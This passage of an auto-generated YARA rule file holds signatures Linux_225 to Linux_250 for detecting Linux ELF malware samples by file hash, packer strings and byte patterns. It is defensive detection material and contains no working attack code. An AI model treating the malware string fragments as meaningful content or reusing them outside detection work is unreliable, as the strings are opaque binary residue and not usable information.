      $s17 = "@?_,E^G" fullword ascii
      $s18 = "W(@UdF" fullword ascii
      $s19 = "3r;S*^O" fullword ascii
      $s20 = "`]b<9S" fullword ascii
   condition:
      uint16(0) == 0x457f and filesize < 200KB and
      8 of them
}

rule Linux_225 {
   meta:
      description = "Linux_225"
      author = "PYAS Security (Using yarGen Rule Generator)"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-03-27"
      hash1 = "37abd9ae1ce97738f9e0b116d887603f5533863cac6b881dd048445b1f96d1d1"
   strings:
      $s1 = ":xsvr@M-SEARCH * HTTP" fullword ascii
      $s2 = "MUHDKPJKCF" fullword ascii
      $s3 = "JCICKGLC" fullword ascii
      $s4 = "edvufv" fullword ascii
      $s5 = "OPQRSTUVWXYZ[\\]^_`abcdefghijklmn" fullword ascii
      $s6 = "objectCla" fullword ascii
      $s7 = "sity 0n Ur>CkInG" fullword ascii
      $s8 = "L33T HaxErSw" fullword ascii
      $s9 = "@srrrDHL" fullword ascii
      $s10 = "3456789:;<=>?@ABCDEFGHvIJKLMN" fullword ascii
      $s11 = "(/proc/self/exe" fullword ascii
      $s12 = "ZVORrFJC" fullword ascii
      $s13 = "R-AGENhGoogl" fullword ascii
      $s14 = "SNQUERY: " fullword ascii
      $s15 = "vHeA<We Bi" fullword ascii
      $s16 = "cover\"*X" fullword ascii
      $s17 = "DGQV\"`RP" fullword ascii
      $s18 = "Chrome/6Q31d." fullword ascii
      $s19 = "RuBAP4HH" fullword ascii
      $s20 = "m&DCWNVM-" fullword ascii
   condition:
      uint16(0) == 0x457f and filesize < 60KB and
      8 of them
}

rule Linux_226 {
   meta:
      description = "Linux_226"
      author = "PYAS Security (Using yarGen Rule Generator)"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-03-27"
      hash1 = "396a8c2a40998af86d8ff1aa81222ce3e65a01e9c7b50921e83fb52e450ab694"
   strings:
      $s1 = "CvUPX!" fullword ascii
      $s2 = "AIZKC[zA" fullword ascii
      $s3 = "|X,UUM[" fullword ascii
      $s4 = "TB$gsp8" fullword ascii
      $s5 = "%JyM&X" fullword ascii
      $s6 = "kA;C]." fullword ascii
      $s7 = "7V*HG<D" fullword ascii
      $s8 = "mb){Z\"" fullword ascii
      $s9 = "wGTVOd" fullword ascii
      $s10 = "d$`DG[" fullword ascii
      $s11 = "q2VnD*" fullword ascii
      $s12 = "f^\"=eFq" fullword ascii
      $s13 = "z(B^Yjh" fullword ascii
      $s14 = "&^y=6uCv" fullword ascii
      $s15 = "|lv(xo" fullword ascii
      $s16 = "=_0OT$x" fullword ascii
      $s17 = "Gs['E>" fullword ascii
      $s18 = "1+$dlE^" fullword ascii
      $s19 = "[*v!q6L" fullword ascii
      $s20 = "kNk`Dj" fullword ascii
   condition:
      uint16(0) == 0x457f and filesize < 50KB and
      8 of them
}

rule Linux_227 {
   meta:
      description = "Linux_227"
      author = "PYAS Security (Using yarGen Rule Generator)"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-03-27"
      hash1 = "5afd4216921f55f063471a3d7b100fb6c8c43bb6191b1bfbc8b230b730ad948a"
   strings:
      $s1 = "CvUPX!" fullword ascii
      $s2 = "=?GsAl^%K" fullword ascii
      $s3 = "TB$gsp8" fullword ascii
      $s4 = "kA;C]." fullword ascii
      $s5 = "[*v!q6L" fullword ascii
      $s6 = ";= GQ4" fullword ascii
      $s7 = "S_1a[UIC" fullword ascii
      $s8 = "8c_'*@" fullword ascii
      $s9 = "*Gd%lVj" fullword ascii
      $s10 = "^Y1P D" fullword ascii
      $s11 = "<d*^C0" fullword ascii
      $s12 = "|$6CqyC" fullword ascii
      $s13 = "9#'L<Q" fullword ascii
      $s14 = "=_P=k::" fullword ascii
      $s15 = "8;r>:2" fullword ascii
      $s16 = "~TP$67" fullword ascii
      $s17 = "rx'#X=" fullword ascii
      $s18 = "k77/G:" fullword ascii
      $s19 = "^N`W_F" fullword ascii
      $s20 = "<=N[:b" fullword ascii
   condition:
      uint16(0) == 0x457f and filesize < 80KB and
      8 of them
}

rule Linux_228 {
   meta:
      description = "Linux_228"
      author = "PYAS Security (Using yarGen Rule Generator)"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-03-27"
      hash1 = "66f69eb0e036c62e16695826f77b35f46cd21ef6147398c6fed885130ef2fbd7"
   strings:
      $s1 = "CvUPX!" fullword ascii
      $s2 = "@rTCb_#{" fullword ascii
      $s3 = "Vbcq@GK" fullword ascii
      $s4 = "TB$gsp8" fullword ascii
      $s5 = "kA;C]." fullword ascii
      $s6 = "[*v!q6L" fullword ascii
      $s7 = "770,E<J" fullword ascii
      $s8 = "&i3-@>j" fullword ascii
      $s9 = "]8d%LS" fullword ascii
      $s10 = "}HUmT[" fullword ascii
      $s11 = "GACXfa" fullword ascii
      $s12 = "2V~SwOq" fullword ascii
      $s13 = "|LZy7W" fullword ascii
      $s14 = "Hl(.1K!" fullword ascii
      $s15 = "'?l6VK" fullword ascii
      $s16 = "%@c>ZOW" fullword ascii
      $s17 = "[iH9N_" fullword ascii
      $s18 = "{-U:v)c" fullword ascii
      $s19 = "c=*t@4KL" fullword ascii
      $s20 = "gF,7l!" fullword ascii
   condition:
      uint16(0) == 0x457f and filesize < 60KB and
      8 of them
}

rule Linux_229 {
   meta:
      description = "Linux_229"
      author = "PYAS Security (Using yarGen Rule Generator)"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-03-27"
      hash1 = "39d5499985b1f8a4a9ff4afe3768c3f10001a13d52faf1ff68bc8750938f10cf"
   strings:
      $s1 = "mmap failed." fullword ascii
      $s2 = "RVSPUWVS" fullword ascii
      $s3 = "QXhP[CyD" fullword ascii
      $s4 = "e%g,Wz" fullword ascii
      $s5 = "\\Auj]6" fullword ascii
      $s6 = "UTjGxJ" fullword ascii
      $s7 = "+cceDI" fullword ascii
      $s8 = "#-JVl:" fullword ascii
      $s9 = "i_8HP|" fullword ascii
      $s10 = "CGp fo" fullword ascii
      $s11 = "_0gNGU" fullword ascii
      $s12 = "A4x\"K,E" fullword ascii
      $s13 = "=LMz4O" fullword ascii
      $s14 = "NFb8Fk<i" fullword ascii
      $s15 = "=LVt'*" fullword ascii
      $s16 = "ram4\"#" fullword ascii
      $s17 = "p.2_k/z" fullword ascii
      $s18 = "<;5r(/" fullword ascii
      $s19 = "A3J{5." fullword ascii
      $s20 = "j&M6[;" fullword ascii
   condition:
      uint16(0) == 0x457f and filesize < 200KB and
      8 of them
}

rule Linux_230 {
   meta:
      description = "Linux_230"
      author = "PYAS Security (Using yarGen Rule Generator)"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-03-27"
      hash1 = "8349b3e93fad752e593e4381d3b845c94ecb1ce029fb2323b02aa785053195f1"
   strings:
      $s1 = "mmap failed." fullword ascii
      $s2 = "RVSPUWVS" fullword ascii
      $s3 = "l*g.?* " fullword ascii
      $s4 = "GMlR%@gSP" fullword ascii
      $s5 = "YhLvf!" fullword ascii
      $s6 = "1SptJ*!)" fullword ascii
      $s7 = "Xypuxy" fullword ascii
      $s8 = "\\-YW$." fullword ascii
      $s9 = "B28q/M" fullword ascii
      $s10 = "sKb<tv" fullword ascii
      $s11 = "}Mj*t!#4" fullword ascii
      $s12 = "&F\\<'u3" fullword ascii
      $s13 = "n:z6G." fullword ascii
      $s14 = "ZB=@~f" fullword ascii
      $s15 = "fQ9Z;p" fullword ascii
      $s16 = "4}h:3{" fullword ascii
      $s17 = "_AJ[tFg" fullword ascii
      $s18 = "uVnf~O" fullword ascii
      $s19 = "(v[$hY" fullword ascii
      $s20 = "'XK<X&" fullword ascii
   condition:
      uint16(0) == 0x457f and filesize < 200KB and
      8 of them
}

rule Linux_231 {
   meta:
      description = "Linux_231"
      author = "PYAS Security (Using yarGen Rule Generator)"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-03-27"
      hash1 = "a8c92b3b4491108fdc6c7cf29ce1a988dce800d874b139fec4be2a0969ce1d75"
   strings:
      $s1 = "mmap failed." fullword ascii
      $s2 = "RVSPUWVS" fullword ascii
      $s3 = "zHvfvMA" fullword ascii
      $s4 = ".dvm\" " fullword ascii
      $s5 = "R|CrzA0,s" fullword ascii
      $s6 = " xK%h," fullword ascii
      $s7 = "\\f+JbpH" fullword ascii
      $s8 = "\\f`W'%" fullword ascii
      $s9 = "B28q/M" fullword ascii
      $s10 = "sKb<tv" fullword ascii
      $s11 = "dL}$h3" fullword ascii
      $s12 = "zkV_CH2" fullword ascii
      $s13 = " jFS`CPH" fullword ascii
      $s14 = "c~VEGg" fullword ascii
      $s15 = "4V4oa19" fullword ascii
      $s16 = "Ad|F)x1=" fullword ascii
      $s17 = "qF4\"X/#" fullword ascii
      $s18 = "J'p]{xU1~Ls" fullword ascii
      $s19 = "5BJdHEm" fullword ascii
      $s20 = "r^ep}n" fullword ascii
   condition:
      uint16(0) == 0x457f and filesize < 200KB and
      8 of them
}

rule Linux_232 {
   meta:
      description = "Linux_232"
      author = "PYAS Security (Using yarGen Rule Generator)"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-03-27"
      hash1 = "48f7b13fd2173f1fe8a5bbc596a0dbfb9cab84648c4baa05a7d50683c4c59e99"
   strings:
      $s1 = "mmap failed." fullword ascii
      $s2 = "$}dCeMpYE" fullword ascii
      $s3 = "JfYK#sc" fullword ascii
      $s4 = "fxDOng!" fullword ascii
      $s5 = "\\~9^\"x" fullword ascii
      $s6 = "Piuc15" fullword ascii
      $s7 = "\\(Ri E" fullword ascii
      $s8 = "x}d:.U" fullword ascii
      $s9 = "h4qGyo]" fullword ascii
      $s10 = "YVNr2(" fullword ascii
      $s11 = "llJ)no" fullword ascii
      $s12 = "uJX2`5" fullword ascii
      $s13 = "m2*}Gk" fullword ascii
      $s14 = "uFD^\"(s" fullword ascii
      $s15 = "<%eq&V" fullword ascii
      $s16 = "|cX08c" fullword ascii
      $s17 = "$WnJGF" fullword ascii
      $s18 = " ,\\0ku" fullword ascii
      $s19 = "\"0.=`Z+H" fullword ascii
      $s20 = "Gww~we" fullword ascii
   condition:
      uint16(0) == 0x457f and filesize < 200KB and
      8 of them
}

rule Linux_233 {
   meta:
      description = "Linux_233"
      author = "PYAS Security (Using yarGen Rule Generator)"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-03-27"
      hash1 = "74c56d8d185fbb346deb70d09740963e1aef8de449285ed60d9f1c412f23e51c"
   strings:
      $s1 = "mmap failed." fullword ascii
      $s2 = "PdbjTDdJ" fullword ascii
      $s3 = "ixjjz1!" fullword ascii
      $s4 = "nfdW:,'" fullword ascii
      $s5 = "9PQzv)$/8" fullword ascii
      $s6 = "CjquolV" fullword ascii
      $s7 = "EeHrI%s" fullword ascii
      $s8 = "x}d:.U" fullword ascii
      $s9 = "|cX08c" fullword ascii
      $s10 = "}HSx8`" fullword ascii
      $s11 = "2c{QLL;" fullword ascii
      $s12 = "@}+X0})P09k" fullword ascii
      $s13 = ".p}HSx|" fullword ascii
      $s14 = "9WF^&B)" fullword ascii
      $s15 = "(P}f;.8g" fullword ascii
      $s16 = ")kx5PU" fullword ascii
      $s17 = "@.UH@.9" fullword ascii
      $s18 = "x}f:.U" fullword ascii
      $s19 = "x}:Kx/" fullword ascii
      $s20 = "0Ti 6 " fullword ascii
   condition:
      uint16(0) == 0x457f and filesize < 200KB and
      8 of them
}

rule Linux_234 {
   meta:
      description = "Linux_234"
      author = "PYAS Security (Using yarGen Rule Generator)"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-03-27"
      hash1 = "a024d09b5ec5fcee0fb633b1134be79553fa4858964543e078d26d1944fda8e8"
   strings:
      $s1 = "mmap failed." fullword ascii
      $s2 = "JNna&^)" fullword ascii
      $s3 = "YlGoru#" fullword ascii
      $s4 = "QmPq]jq" fullword ascii
      $s5 = "(K0FtaPz)#XBs" fullword ascii
      $s6 = "sacc*K2" fullword ascii
      $s7 = "iH.Gyd}s" fullword ascii
      $s8 = "kCDF/<KMz" fullword ascii
      $s9 = "hOPuC8" fullword ascii
      $s10 = "x}d:.U" fullword ascii
      $s11 = "|cX08c" fullword ascii
      $s12 = "}HSx8`" fullword ascii
      $s13 = "2c{QLL;" fullword ascii
      $s14 = "@}+X0})P09k" fullword ascii
      $s15 = ".p}HSx|" fullword ascii
      $s16 = "9WF^&B)" fullword ascii
      $s17 = "(P}f;.8g" fullword ascii
      $s18 = ")kx5PU" fullword ascii
      $s19 = "@.UH@.9" fullword ascii
      $s20 = "x}f:.U" fullword ascii
   condition:
      uint16(0) == 0x457f and filesize < 200KB and
      8 of them
}

rule Linux_235 {
   meta:
      description = "Linux_235"
      author = "PYAS Security (Using yarGen Rule Generator)"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-03-27"
      hash1 = "414f89244a2a7d409d121a8c12f2143534da9b6319f91d089bcdc8c4fc7e5c7a"
   strings:
      $s1 = "(!PROT_EXEC|PROT_WRITE failed." fullword ascii
      $s2 = "YwKn?@" fullword ascii
      $s3 = "frwL>yN:y#p" fullword ascii
      $s4 = "PtaJz1" fullword ascii
      $s5 = "H(M_OCfep" fullword ascii
      $s6 = "Tq{}>qr" fullword ascii
      $s7 = ")3)Ume" fullword ascii
      $s8 = "[&j,ke" fullword ascii
      $s9 = "j\";j(t" fullword ascii
      $s10 = "J^~Ug6" fullword ascii
      $s11 = "XFL>\"%" fullword ascii
      $s12 = "t=-g=}" fullword ascii
      $s13 = "6Sae6W-|" fullword ascii
      $s14 = "rS$5%M]" fullword ascii
      $s15 = "`JXnnX" fullword ascii
      $s16 = "k~^^9?" fullword ascii
      $s17 = "'Gz]1@" fullword ascii
      $s18 = "b<gqh5" fullword ascii
      $s19 = "N_f[ghoY" fullword ascii
      $s20 = "kgq]\\DE" fullword ascii
   condition:
      uint16(0) == 0x457f and filesize < 70KB and
      8 of them
}

rule Linux_236 {
   meta:
      description = "Linux_236"
      author = "PYAS Security (Using yarGen Rule Generator)"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-03-27"
      hash1 = "741095beecea7cb983c72b0a0ebd3f5bfbe0b4699b3779325ece444f10060cd4"
   strings:
      $s1 = "(!PROT_EXEC|PROT_WRITE failed." fullword ascii
      $s2 = "/kXKu~dn'v" fullword ascii
      $s3 = "tGFh/Ji" fullword ascii
      $s4 = "K!.epW" fullword ascii
      $s5 = "@gHExyoi" fullword ascii
      $s6 = "AQyV##NYK" fullword ascii
      $s7 = "ooSF;2=" fullword ascii
      $s8 = "\\R0ypY" fullword ascii
      $s9 = "cGlmt0" fullword ascii
      $s10 = "mSO?a[" fullword ascii
      $s11 = "(/-u7w" fullword ascii
      $s12 = ".z/w+h" fullword ascii
      $s13 = "wr8.?dJW" fullword ascii
      $s14 = "KXc%4u" fullword ascii
      $s15 = "f)SN{4" fullword ascii
      $s16 = "IaT?kOHB'" fullword ascii
      $s17 = "9zglT+" fullword ascii
      $s18 = "yE(Y5~(" fullword ascii
      $s19 = "c:R{VL" fullword ascii
      $s20 = "*<UD)C" fullword ascii
   condition:
      uint16(0) == 0x457f and filesize < 200KB and
      8 of them
}

rule Linux_237 {
   meta:
      description = "Linux_237"
      author = "PYAS Security (Using yarGen Rule Generator)"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-03-27"
      hash1 = "77e6eb1e5234d6264db9d1afa0b1a869e9c3fa1d5c6c460a839c6f5715c755bc"
   strings:
      $s1 = "(!PROT_EXEC|PROT_WRITE failed." fullword ascii
      $s2 = "JSQNP'F" fullword ascii
      $s3 = "YHFpf]lk" fullword ascii
      $s4 = "wivyaR=" fullword ascii
      $s5 = "pzLu]-X" fullword ascii
      $s6 = "6qw%n,jz" fullword ascii
      $s7 = "lGDe43" fullword ascii
      $s8 = "\\P@kxU" fullword ascii
      $s9 = "39R0flU" fullword ascii
      $s10 = "X4;;+:" fullword ascii
      $s11 = "G j8@F" fullword ascii
      $s12 = "gO\\&Ypu" fullword ascii
      $s13 = "H4RXn>" fullword ascii
      $s14 = "![>VZ-c" fullword ascii
      $s15 = "(lg79. " fullword ascii
      $s16 = "?%'-iG" fullword ascii
      $s17 = "2?bJ$K" fullword ascii
      $s18 = "MfS>WC]" fullword ascii
      $s19 = "DEW'F[{" fullword ascii
      $s20 = "0evM<CQy" fullword ascii
   condition:
      uint16(0) == 0x457f and filesize < 200KB and
      8 of them
}

rule Linux_238 {
   meta:
      description = "Linux_238"
      author = "PYAS Security (Using yarGen Rule Generator)"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-03-27"
      hash1 = "92db8ea9ca280218a047d49fe329c10254d42f01f7c342b463faac9d7e8d7720"
   strings:
      $s1 = "(!PROT_EXEC|PROT_WRITE failed." fullword ascii
      $s2 = "srMyE|l_oh" fullword ascii
      $s3 = "wjMb8/L" fullword ascii
      $s4 = "nLCw)la%" fullword ascii
      $s5 = "DGCoH@\\7J#" fullword ascii
      $s6 = "\\r_x,|x@," fullword ascii
      $s7 = "\\54vCW" fullword ascii
      $s8 = "\\K>q4p" fullword ascii
      $s9 = "39R0flU" fullword ascii
      $s10 = "X4;;+:" fullword ascii
      $s11 = "!XPX;fjs" fullword ascii
      $s12 = "G j8@F" fullword ascii
      $s13 = "cJ*8zD)X<" fullword ascii
      $s14 = "*N7nkf" fullword ascii
      $s15 = ":Ue{d/I" fullword ascii
      $s16 = "fa~+2;?d~!" fullword ascii
      $s17 = "\"mhkgr" fullword ascii
      $s18 = "aY/jwT" fullword ascii
      $s19 = "#j4.\\eP" fullword ascii
      $s20 = "AzB)jz" fullword ascii
   condition:
      uint16(0) == 0x457f and filesize < 200KB and
      8 of them
}

rule Linux_239 {
   meta:
      description = "Linux_239"
      author = "PYAS Security (Using yarGen Rule Generator)"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-03-27"
      hash1 = "b5da31ed4d9e9ad79e32d059d546d4aa4d6769eb7f3a628fa44ef53273c7db55"
   strings:
      $s1 = "(!PROT_EXEC|PROT_WRITE failed." fullword ascii
      $s2 = "AJEWY60" fullword ascii
      $s3 = "SbIeuOX" fullword ascii
      $s4 = ":ARWp D;e" fullword ascii
      $s5 = "CItt!!" fullword ascii
      $s6 = "Db.cik" fullword ascii
      $s7 = "39R0flU" fullword ascii
      $s8 = "X4;;+:" fullword ascii
      $s9 = "!XPX;fjs" fullword ascii
      $s10 = "G j8@F" fullword ascii
      $s11 = "!\"Kuxe" fullword ascii
      $s12 = "'$w.}r" fullword ascii
      $s13 = "1D)ARX#i" fullword ascii
      $s14 = "B8)}!D;:^D" fullword ascii
      $s15 = "a\\;@.&b" fullword ascii
      $s16 = "u},\\9;" fullword ascii
      $s17 = "W^(jyW" fullword ascii
      $s18 = "*,*.8V" fullword ascii
      $s19 = "CdaOFH" fullword ascii
      $s20 = "2)<p3IZ" fullword ascii
   condition:
      uint16(0) == 0x457f and filesize < 200KB and
      8 of them
}

rule Linux_240 {
   meta:
      description = "Linux_240"
      author = "PYAS Security (Using yarGen Rule Generator)"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-03-27"
      hash1 = "b651f8a02f54e50c38195e62ebcacc8a7975aa8f8c5d763da0edbc15d205c55e"
   strings:
      $s1 = "(!PROT_EXEC|PROT_WRITE failed." fullword ascii
      $s2 = " -$gk>~L" fullword ascii
      $s3 = "6y%Lc%G;" fullword ascii
      $s4 = ",>IW+ " fullword ascii
      $s5 = "ga;* @!" fullword ascii
      $s6 = "z1%.WaP" fullword ascii
      $s7 = "'OeST?STd" fullword ascii
      $s8 = "BW9Itgx!" fullword ascii
      $s9 = "OerejvV" fullword ascii
      $s10 = "Oyky5pY" fullword ascii
      $s11 = "LtvT\"T" fullword ascii
      $s12 = "W4lhHQE\"s" fullword ascii
      $s13 = "etEN\\G" fullword ascii
      $s14 = "DIeor(Q8" fullword ascii
      $s15 = "UYmcRzD" fullword ascii
      $s16 = "FyJYJpe" fullword ascii
      $s17 = "DxSWr5" fullword ascii
      $s18 = "pBhp64" fullword ascii
      $s19 = "39R0flU" fullword ascii
      $s20 = "X4;;+:" fullword ascii
   condition:
      uint16(0) == 0x457f and filesize < 200KB and
      8 of them
}

rule Linux_241 {
   meta:
      description = "Linux_241"
      author = "PYAS Security (Using yarGen Rule Generator)"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-03-27"
      hash1 = "be8e8fee33ebbe8b75b5715c5c64c542213abb5d5812c98fbe2635c9eda93e5a"
   strings:
      $s1 = "(!PROT_EXEC|PROT_WRITE failed." fullword ascii
      $s2 = "\\.qOk!" fullword ascii
      $s3 = " /wjb0.i" fullword ascii
      $s4 = "tPDIVCJ`" fullword ascii
      $s5 = "ctZs`\"" fullword ascii
      $s6 = "SXlvD.I" fullword ascii
      $s7 = "^EUO.MTq" fullword ascii
      $s8 = "BMVrF\\9" fullword ascii
      $s9 = "39R0flU" fullword ascii
      $s10 = "X4;;+:" fullword ascii
      $s11 = "G j8@F" fullword ascii
      $s12 = "O'1;5g" fullword ascii
      $s13 = "ZGG 1-" fullword ascii
      $s14 = "ch,1R*" fullword ascii
      $s15 = "N,~gb+W\\" fullword ascii
      $s16 = "|I%fHHDg" fullword ascii
      $s17 = "Q.cX~7" fullword ascii
      $s18 = "P{^+V4->" fullword ascii
      $s19 = "Nu 8Sf" fullword ascii
      $s20 = "@8hO'$" fullword ascii
   condition:
      uint16(0) == 0x457f and filesize < 200KB and
      8 of them
}

rule Linux_242 {
   meta:
      description = "Linux_242"
      author = "PYAS Security (Using yarGen Rule Generator)"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-03-27"
      hash1 = "627839506cf16aa9ecc7e0522ea0cc3dc9937aff637c6db6aef72812b0eccd40"
   strings:
      $s1 = "BAdAsV" fullword ascii

      $op0 = { f0 45 2d e9 34 30 92 e5 98 50 9f e5 01 a0 73 e2 }
      $op1 = { f4 ff ff ff f4 ff ff ff 7c 08 00 00 f4 ff ff ff }
      $op2 = { 51 e3 f0 45 2d e9 00 50 a0 e1 27 00 00 da b4 a0 }
   condition:
      uint16(0) == 0x457f and filesize < 200KB and
      ( all of them and all of ($op*) )
}

rule Linux_243 {
   meta:
      description = "Linux_243"
      author = "PYAS Security (Using yarGen Rule Generator)"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-03-27"
      hash1 = "84012416cb251e3149f3c47271fd88e820a896a3255726b649955dd2beab744f"
   strings:
      $s1 = "BAdAsV" fullword ascii

      $op0 = { 80 a4 e0 00 12 80 00 0f b5 34 60 10 b6 10 20 00 }
      $op1 = { 80 a5 60 00 12 bf ff ad d0 34 60 02 40 00 08 8f }
      $op2 = { 90 0a 20 ff 80 a2 20 00 04 80 00 11 94 0a a0 ff }
   condition:
      uint16(0) == 0x457f and filesize < 200KB and
      ( all of them and all of ($op*) )
}

rule Linux_244 {
   meta:
      description = "Linux_244"
      author = "PYAS Security (Using yarGen Rule Generator)"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-03-27"
      hash1 = "cc24c3bab0cb491ccea6894d57d3144c2f361e8203e9978aa8d458abb380dafe"
   strings:
      $s1 = "BAdAsV" fullword ascii
      $s2 = " $BRp'9R" fullword ascii

      $op0 = { 3c 03 2e 1a 34 63 06 c3 00 43 00 19 8f bc 00 10 }
      $op1 = { 03 20 f8 09 34 10 ff ff 8f bc 00 18 17 d0 ff b4 }
      $op2 = { 24 97 00 08 24 9e 00 34 1a 80 ff ff }
   condition:
      uint16(0) == 0x457f and filesize < 200KB and
      ( all of them and all of ($op*) )
}

rule Linux_245 {
   meta:
      description = "Linux_245"
      author = "PYAS Security (Using yarGen Rule Generator)"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-03-27"
      hash1 = "e5d8cc0187d123f852b369d1ba976bfd7856a5d8f498a299f2053981e0178c39"
   strings:
      $s1 = "BAdAsV" fullword ascii

      $op0 = { f0 40 2d e9 00 c0 50 e2 65 df 4d e2 20 10 a0 13 }
      $op1 = { 02 60 a0 e1 01 e1 82 e0 00 20 92 e5 78 d0 4d e2 }
      $op2 = { 70 40 2d e9 00 40 51 e2 46 df 4d e2 00 60 a0 e1 }
   condition:
      uint16(0) == 0x457f and filesize < 200KB and
      ( all of them and all of ($op*) )
}

rule Linux_246 {
   meta:
      description = "Linux_246"
      author = "PYAS Security (Using yarGen Rule Generator)"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-03-27"
      hash1 = "f21a17935cff024f4e0b5ba9603eb6ebbffb4afda2952e6cae41dfb28d858c63"
   strings:
      $s1 = "BAdAsV" fullword ascii

      $op0 = { 1a 2e 03 3c c3 06 63 34 19 00 43 00 10 00 bc 8f }
      $op1 = { ff ff 10 34 61 00 d0 12 }
      $op2 = { 09 f8 20 03 ff ff 10 34 18 00 bc 8f a1 ff d0 16 }
   condition:
      uint16(0) == 0x457f and filesize < 200KB and
      ( all of them and all of ($op*) )
}

rule Linux_247 {
   meta:
      description = "Linux_247"
      author = "PYAS Security (Using yarGen Rule Generator)"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-03-27"
      hash1 = "42fb7565e47d04bcf1264aa76cefe76c5daff00031843bec7cee04d0b690aede"
   strings:
      $s1 = "TuzrH8-" fullword ascii
      $s2 = "$cOm'$" fullword ascii
      $s3 = "obUjeWKQ" fullword ascii
      $s4 = "HvNRjO," fullword ascii
      $s5 = "PoIH^]I,?'" fullword ascii
      $s6 = "3RtsGKrk" fullword ascii
      $s7 = "YPkP]Nx" fullword ascii
      $s8 = "xVIl05" fullword ascii
      $s9 = "#K:rcz" fullword ascii
      $s10 = "z44`R<M" fullword ascii
      $s11 = "@L|jO>" fullword ascii
      $s12 = "[BjT7W)7Y|" fullword ascii
      $s13 = "P6r'^E}*" fullword ascii
      $s14 = "Y4tlW5{" fullword ascii
      $s15 = "4Uu5m,bV" fullword ascii
      $s16 = "Ur\\l`I" fullword ascii
      $s17 = "Nun)Z|y" fullword ascii
      $s18 = "rx\\T`N)#j." fullword ascii
      $s19 = "3zn*tU" fullword ascii
      $s20 = "k2zjjN" fullword ascii
   condition:
      uint16(0) == 0x457f and filesize < 100KB and
      8 of them
}

rule Linux_248 {
   meta:
      description = "Linux_248"
      author = "PYAS Security (Using yarGen Rule Generator)"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-03-27"
      hash1 = "74a12c37da10a28d879a3a4517d63b91ea4e06df2cacdbe5722350f398ce3fe2"
   strings:
      $s1 = "/GvA* " fullword ascii
      $s2 = " -h`ebc" fullword ascii
      $s3 = "cMSrX^{" fullword ascii
      $s4 = "mhQy.Q{?" fullword ascii
      $s5 = "`IsLOJ\\" fullword ascii
      $s6 = "bQdsX+@" fullword ascii
      $s7 = " NUPX!" fullword ascii
      $s8 = "o9ruVu{" fullword ascii
      $s9 = "b/h>@%" fullword ascii
      $s10 = "/Cw@Z&" fullword ascii
      $s11 = "(im}V8" fullword ascii
      $s12 = "hR!r&Rk" fullword ascii
      $s13 = "|BCH't." fullword ascii
      $s14 = "/-bcOh/" fullword ascii
      $s15 = "=iO9rX" fullword ascii
      $s16 = "1La<\"p%" fullword ascii
      $s17 = "a$hWq4" fullword ascii
      $s18 = "wMcu4h" fullword ascii
      $s19 = "aEkPrf" fullword ascii
      $s20 = "V3Ir;;^" fullword ascii
   condition:
      uint16(0) == 0x457f and filesize < 100KB and
      8 of them
}

rule Linux_249 {
   meta:
      description = "Linux_249"
      author = "PYAS Security (Using yarGen Rule Generator)"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-03-27"
      hash1 = "b44ff359df589bf0ffe7aca96439d35a4e51a8c0cc6d225a3ceffec2c26ed293"
   strings:
      $s1 = "BcKXgl[K" fullword ascii
      $s2 = "NVzcySh" fullword ascii
      $s3 = "o9ruVu{" fullword ascii
      $s4 = "b/h>@%" fullword ascii
      $s5 = "/Cw@Z&" fullword ascii
      $s6 = "'BRn:2" fullword ascii
      $s7 = "8;I<hT" fullword ascii
      $s8 = "r$sQBsA" fullword ascii
      $s9 = "#p*ozn" fullword ascii
      $s10 = "!9PT&|Xx`\"" fullword ascii
      $s11 = "ixL:Ee" fullword ascii
      $s12 = "O%f4/'" fullword ascii
      $s13 = "bg1[Nb" fullword ascii
      $s14 = ".7]G*g" fullword ascii
      $s15 = "H-QIlS6~" fullword ascii
      $s16 = "b\\R\\02" fullword ascii
      $s17 = "e==NtW" fullword ascii
      $s18 = "8Bx4-O[" fullword ascii
      $s19 = "v1=:$ma" fullword ascii
      $s20 = "U\"*[@Mu" fullword ascii
   condition:
      uint16(0) == 0x457f and filesize < 80KB and
      8 of them
}

rule Linux_250 {
   meta:
      description = "Linux_250"
      author = "PYAS Security (Using yarGen Rule Generator)"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-03-27"
      hash1 = "a5ee6bd2710c047277b2e311560cd6b76e6f2354c220b0a125c57bfc4e86eb44"
   strings:
      $s1 = "ZraSW mC" fullword ascii
      $s2 = "HWhj[6.\"" fullword ascii
      $s3 = "WzYtvl-]" fullword ascii
      $s4 = "KlHl\"m" fullword ascii
      $s5 = "x}d:.U" fullword ascii
      $s6 = "|cX08c" fullword ascii
      $s7 = "}HSx8`" fullword ascii
      $s8 = "@}+X0})P09k" fullword ascii
      $s9 = ".p}HSx|" fullword ascii
      $s10 = "(P}f;.8g" fullword ascii
      $s11 = "@.UH@.9" fullword ascii
      $s12 = "x}f:.U" fullword ascii
      $s13 = "x}:Kx/" fullword ascii
      $s14 = "0Ti 6 " fullword ascii
      $s15 = ":gf=da" fullword ascii
      $s16 = "pyM,5H" fullword ascii
      $s17 = "::$;sS{" fullword ascii
      $s18 = "|V:ker" fullword ascii
      $s19 = "&k?H{8" fullword ascii
      $s20 = "m5\\.GMBXN" fullword ascii
